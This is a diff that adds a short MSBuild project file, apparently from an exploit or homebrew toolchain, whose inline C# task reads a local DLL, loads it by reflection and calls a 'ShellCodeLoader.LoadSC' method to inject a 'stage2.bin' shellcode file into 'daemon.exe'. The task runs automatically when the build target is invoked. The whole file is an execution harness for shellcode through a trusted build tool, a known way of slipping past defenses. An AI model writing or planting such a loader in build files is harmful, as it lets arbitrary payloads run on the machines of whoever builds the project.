@@ -1,0 +1,31 @@
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<UsingTask
+		TaskName="InvokeCommandTask"
+		TaskFactory="RoslynCodeTaskFactory"
+		AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll" >
+		<Task>
+			<Using Namespace="System" />
+			<Using Namespace="System.IO" />
+			<Using Namespace="System.Reflection"/>
+			<Code Type="Fragment" Language="cs">
+				<![CDATA[
+				Console.Write("Loading assembly ... ");
+
+			    var dll = File.ReadAllBytes(@"D:\sc\DurangoInteropDotnet.dll");				
+			    var loader = Assembly.Load(dll);
+			    var manager = loader.GetType("ShellCodeLoader")!;
+
+			    var loadShellcode = manager.GetMethod("LoadSC", BindingFlags.Static | BindingFlags.Public)!;
+				loadShellcode.Invoke(null, new object[]{"D:\\sc\\stage2.bin", "D:\\sc\\daemon.exe", ""});
+				
+				Console.WriteLine("done.");
+  ]]>
+			</Code>
+		</Task>
+	</UsingTask>
+
+	<Target Name="EntryTarget">
+		<InvokeCommandTask/>
+	</Target>
+
+</Project>
